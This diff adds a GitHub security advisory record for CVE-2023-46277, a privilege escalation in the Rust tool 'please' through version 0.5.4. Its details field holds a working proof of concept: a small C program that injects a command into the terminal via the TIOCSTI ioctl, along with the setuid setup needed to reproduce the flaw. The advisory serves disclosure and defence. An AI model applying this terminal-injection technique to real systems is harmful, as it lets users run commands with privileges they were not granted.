@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-cgf8-h3fp-h956",
+  "modified": "2023-10-31T21:41:25Z",
+  "published": "2023-10-20T06:30:19Z",
+  "aliases": [
+    "CVE-2023-46277"
+  ],
+  "summary": "Pleaser privilege escalation vulnerability",
+  "details": "please (aka pleaser) through 0.5.4 allows privilege escalation through the TIOCSTI and/or TIOCLINUX ioctl. (If both TIOCSTI and TIOCLINUX are disabled, this cannot be exploited.)\n\nHere is how to see it in action:\n\n```\n$ cd \"$(mktemp -d)\"\n$ git clone --depth 1 https://gitlab.com/edneville/please.git\n$ cd please/\n$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9\n$ cargo test && cargo build --release\n$ echo \"[${USER}_as_nobody]\"$'\\nname='\"${USER}\"$'\\ntarget=nobody\\nrule=.*\\nrequire_pass=false' | sudo tee /etc/please.ini\n$ sudo chown root:root ./target/release/please\n$ sudo chmod u+s ./target/release/please\n$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c\n#include <sys/ioctl.h>\n\nint main(void) {\n  const char *text = \"id\\n\";\n  while (*text)\n    ioctl(0, TIOCSTI, text++);\n  return 0;\n}\nTIOCSTI_C_EOF\n$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c\n$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody\n```\n\nPlease note that:\n\nThis affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "pleaser"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.5.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46277"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rustsec/advisory-db/pull/1798"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://gitlab.com/edneville/please"
+    },
+    {
+      "type": "WEB",
+      "url": "https://gitlab.com/edneville/please/-/issues/13"
+    },
+    {
+      "type": "WEB",
+      "url": "https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575"
+    },
+    {
+      "type": "WEB",
+      "url": "https://rustsec.org/advisories/RUSTSEC-2023-0066.html"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-20T22:37:41Z",
+    "nvd_published_at": "2023-10-20T05:15:08Z"
+  }
+}
